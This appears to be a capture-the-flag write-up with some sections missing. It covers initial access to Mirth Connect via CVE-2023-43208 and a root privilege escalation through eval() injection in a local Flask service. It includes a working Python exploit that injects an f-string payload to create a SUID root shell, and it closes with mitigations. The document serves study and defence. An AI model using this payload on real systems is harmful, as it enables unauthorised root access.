01. Initial Access — CVE-2023-43208

Vulnerability Overview

Mirth Connect v4.4.0 is affected by CVE-2023-43208, a critical Java deserialization vulnerability allowing unauthenticated Remote Code Execution. The Metasploit module exploit/multi/http/mirth_connect_cve_2023_43208 provides a reliable exploitation path.

03. Privilege Escalation — eval() Injection

Process Enumeration

Reviewing processes running as root revealed a Flask server on localhost:

sedric@interpreter:~$ ps aux | grep root | grep python
root  3542  ...  /usr/bin/python3 /usr/local/bin/notif.py

sedric@interpreter:~$ ss -tlnp | grep 54321
LISTEN 0  128  127.0.0.1:54321  0.0.0.0:*

Code Analysis — notif.py

The server accepts XML POST requests at /addPatient and passes field values through a template() function. The critical flaw is twofold:

  1. The input validation regex explicitly permits { and }: 
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
  2. User-controlled input is interpolated into an f-string and passed to eval(): 
    template = f"...received from {sender} at {ts}"
return eval(f"f'''{template}'''")

Any Python expression placed inside {} within a controlled field is executed with root privileges.

Exploit

The payload targets the sender_app XML field, embedding a Python expression that decodes and executes a Base64-encoded shell command:

import requests, base64

TARGET = "http://127.0.0.1:54321/addPatient"

# Command: create SUID bash copy at /tmp/.sh
cmd     = "install -o root -m 4755 /bin/bash /tmp/.sh"
cmd_b64 = base64.b64encode(cmd.encode()).decode()

injection = "{__import__('os').popen(__import__('base64').b64decode('" + cmd_b64 + "').decode()).read()}"

xml = (
    "<patient>"
    "<sender_app>" + injection + "</sender_app>"
    "<firstname>a</firstname><lastname>a</lastname>"
    "<timestamp>a</timestamp>"
    "<birth_date>01/01/2000</birth_date>"
    "<gender>a</gender>"
    "</patient>"
)

r = requests.post(TARGET, headers={"Content-Type": "application/xml"}, data=xml)
print(r.text)

05. Mitigations

CVE-2023-43208

Upgrade Mirth Connect to v4.4.1 or later. Restrict the admin interface to trusted networks and enforce authentication at the network layer.

Plaintext Credentials in Config Files

Sensitive values like database passwords must never be stored in plaintext. Use a secrets manager (HashiCorp Vault, AWS Secrets Manager, etc.) and restrict config file permissions to the owning service account only.

Unsafe eval() in Server-Side Code

Never pass user-controlled data to eval() or exec(). Replace with a safe templating engine such as Jinja2 (with sandboxing) or use str.format_map() with a restricted namespace. The regex whitelist here was a false control — it permitted the exact characters ({}) needed for code injection.

Principle of Least Privilege

The notification server only needed to write files to /var/secure-health/patients/. Running it as root was entirely unnecessary. A dedicated low-privilege service account would have made this privesc path impossible regardless of the code vulnerability.
